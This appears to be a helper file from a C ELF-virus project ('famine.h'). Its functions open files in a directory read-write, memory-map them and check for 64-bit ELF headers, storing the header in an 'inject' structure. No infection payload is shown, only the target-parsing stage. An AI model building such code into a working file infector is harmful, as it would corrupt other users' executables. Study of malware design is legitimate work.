#include "../include/famine.h"

void perror_file(char *error, char *file_name, t_arg_data *data)
{
    if (data->debug)
        fprintf(stderr, "\t !! %s %s: %s\n", error, file_name, strerror(errno));
}

void error_file(char *cmd, char *file_name, char *error, t_arg_data *data)
{
    if (data->debug)
        fprintf(stderr, "\t !! %s %s: %s\n", cmd, file_name, error);
}

int open_file(char *file_name, t_arg_data *data)
{
    int fd = open(file_name, O_RDWR);
    if (fd < 0)
        perror_file("Open", file_name, data);
    return fd;
}

void print_open(char *file_name, t_arg_data *data)
{
    if (!data->debug)
        return;
    printf("\tFile detect: open \"%s\"\n", file_name);
}

bool mmap_file(t_file *file, t_arg_data *data)
{
    struct stat file_stat;

    if (fstat(file->fd, &file_stat) == -1)    
        return perror_file("Fstat", file->complet_file_name, data), false;
    file->file_data = mmap(NULL, file_stat.st_size, PROT_READ, MAP_SHARED, file->fd, 0);
    if (file->file_data == MAP_FAILED)
        return perror_file("Mmap", file->complet_file_name, data), false;
    file->size_mmap = file_stat.st_size;
    if (data->debug)
        printf("\tmmap %s: done\n", file->complet_file_name);
    return true;
}

bool check_format(t_file *file, t_arg_data *data)
{
    Elf64_Ehdr *header = (Elf64_Ehdr *)file->file_data;

	if (header->e_ident[EI_CLASS] == ELFCLASS32)
        return error_file("check_format", file->complet_file_name, "32 bit ELF not managed\n", data), false;
	else if (header->e_ident[EI_CLASS] == ELFCLASS64)
    {
        file->inject.header = header;
        if (data->debug)
            printf("\tDectect ELF 64 bit: %s\n", file->complet_file_name);
        return true;
    }
	else
        error_file("check_format", file->complet_file_name, "file type isn't ELF 64 bit", data);
    return false;
}

bool parse_file(char *path, char *file_name, t_file *file, t_arg_data *data)
{
    char *complet_file_name = calloc(strlen(file_name) + strlen(path) + 2, sizeof(char));
    strcat(complet_file_name, path);
    strcat(complet_file_name, "/");
    strcat(complet_file_name, file_name);
    file->complet_file_name = complet_file_name;
    file->fd = open_file(complet_file_name, data);
    if (file->fd < 0)
        return false;
    print_open(complet_file_name, data);
    if (!mmap_file(file, data))
        return false;
    return check_format(file, data);
}